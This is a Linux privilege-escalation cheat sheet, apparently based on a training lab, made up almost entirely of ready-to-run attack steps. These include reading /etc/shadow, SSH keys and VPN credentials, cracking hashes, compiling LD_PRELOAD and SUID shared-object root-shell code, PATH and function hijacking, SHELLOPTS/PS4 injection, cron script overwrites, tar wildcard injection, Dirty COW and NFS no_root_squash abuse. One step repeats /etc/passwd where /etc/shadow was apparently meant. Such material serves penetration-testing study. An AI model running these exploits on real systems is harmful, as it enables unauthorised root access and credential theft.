# _Linux Privilege Escalation_ cheatsheet
> get used programs/scripts (& more) in `/tools`

<br>

## linux-privesc-suggestor
- https://github.com/The-Z-Labs/linux-exploit-suggester
- *detection*
  - `./linux-exploit-suggester.sh`
- *exploitation*
  - `gcc -pthread /home/user/tools/dirtycow/c0w.c -o c0w`


<br>

## openvpn config files
- `cat /home/user/myvpn.ovpn`
- `cat /etc/openvpn/auth.txt`
- `cat /home/user/.irssi/config | grep -i passw`


<br>

## bash history
- `cat ~/.bash_history | grep -i passw`


<br>

## weak file permissions
- *detection*
  - `ls -la /etc/shadow`
- *exploitation*
  - __target linux__
    - save/copy these files
      - `cat /etc/passwd`
      - `cat /etc/passwd`
  - __attacker linux__
    - `unshadow <PASSWORD-FILE> <SHADOW-FILE> > unshadowed.txt`
    - `hashcat -m 1800 unshadowed.txt rockyou.txt -O`


<br>

## ssh keys
- *detection*
  - `find / -name authorized_keys 2> /dev/null`
  - `find / -name id_rsa 2> /dev/null`
- *exploitation*
  - __target linux__
    - save/copy these files
  - __attacker linux__
    - `chmod 400 id_rsa`
    - `ssh -i id_rsa root@<ip>`



<br>

## sudo 
> *detection*
  - `sudo -l`
  - notice the list of programs that can run via sudo

> *exploitation*
### shell escaping
- https://gtfobins.github.io/

### abusing intended functionality
- __target linux__
  - `sudo apache2 -f /etc/shadow` 
  - copy root hash
- __attacker linux__
  - `echo '[Pasted Root Hash]' > hash.txt`
  - `john --wordlist=/usr/share/wordlists/nmap.lst hash.txt`
  - `john --show hash.txt`

### LD_PRELOAD
- notice that the LD_PRELOAD environment variable is intact
- save following program as (suppose) `x.c`
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
- `sudo LD_PRELOAD=/tmp/x.so apache2`


<br>

## SUID 
### shared object injection
- *detection*
  - `find / -type f -perm -04000 -ls 2>/dev/null`
  - `strace /usr/local/bin/suid-so 2>&1 | grep -i -E "open|access|no such file"`
  - notice that `a.so` file is missing from a writable directory
- *exploitation*
  - `mkdir /home/user/.config`
  - `cd /home/user/.config`
  - save following program as `libcalc.c`
```
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject() {
    system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
  - `gcc -shared -o /home/user/.config/libcalc.so -fPIC /home/user/.config/libcalc.c`
  - `/usr/local/bin/suid-so`

### symlinks
- *detection*
  - `dpkg -l | grep nginx`
  - notice that the installed nginx version is below 1.6.2-5+deb8u3
- *exploitation*
  - __target linux 1__
    - req. user = `www-data`
      - simulate = `su root` > `su -l www-data`
    - https://github.com/xl7dev/Exploit/blob/master/Nginx/nginxed-root.sh
      - `/home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log`
    - now the system waits for logrotate to execute
  - __target linux 2__
    - `invoke-rc.d nginx rotate >/dev/null 2>&1` as root
  - __target linux 1__
    - notice that the exploit continued its execution

### environment variables
- __type 1__
  - *detection*
    - `find / -type f -perm -04000 -ls 2>/dev/null`
    - make note of all the SUID binaries
    - `strings /usr/local/bin/suid-env`
    - notice the functions used by the binary
  - *exploitation*
    - `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/service.c`
    - `gcc /tmp/service.c -o /tmp/service`
    - `export PATH=/tmp:$PATH`
    - `/usr/local/bin/suid-env`
- __type 2__
  - *detection*
    - `find / -type f -perm -04000 -ls 2>/dev/null`
    - make note of all the SUID binaries
    - `strings /usr/local/bin/suid-env2`
    - notice the functions used by the binary
  - *exploitation*
    - __method 1__
      - `function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }`
      - `export -f /usr/sbin/service`
      - `/usr/local/bin/suid-env2`
    - __method 2__
      - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp && chown root.root /tmp/bash && chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'`


<br>

## capabilities
- *detection*
  - `getcap -r / 2>/dev/null`
  - notice the value of the “cap_setuid” capability
- *exploitation*
  - `/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

## Cron 
### path
- *detection*
  - `cat /etc/crontab`
  - notice the value of the “PATH” variable
- *exploitation*
  - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh` where `overwrite.sh` is file executed by cron
  - `chmod +x /home/user/overwrite.sh`
  - wait until the job runs to give root & then `/tmp/bash -p`

### wildcards
- *detection*
  - `cat /etc/crontab`
  - notice the script “/usr/local/bin/compress.sh”
  - `cat /usr/local/bin/compress.sh`
  - notice the wildcard (*) used by ‘tar’
- *exploitation*
  - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/runme.sh`
  - `touch /home/user/--checkpoint=1`
  - `touch /home/user/--checkpoint-action=exec=sh\ runme.sh`
  - wait until the job runs to give root & then `/tmp/bash -p`

### file overwrite
- *detection*
  - `cat /etc/crontab`
  - notice the script “overwrite.sh”
  - `ls -l /usr/local/bin/overwrite.sh`
  - notice the file permissions
- *exploitation*
  - `echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh`
  - wait until the job runs to give root & then `/tmp/bash -p`


<br>

## NFS root squashing
- *detection*
  - `cat /etc/exports`
  - notice that “no_root_squash” option is defined for the “/tmp” export
- *exploitation*
  - __attacker linux__
    - `showmount -e <taget_linux_ip>`
    - `mkdir /tmp/1`
    - `mount -o rw,vers=2 10.10.249.85:/tmp /tmp/1`
    - `echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c`
    - `gcc /tmp/1/x.c -o /tmp/1/x`
    - `chmod +s /tmp/1/x`
  - __target linux__
    - `/tmp/x`
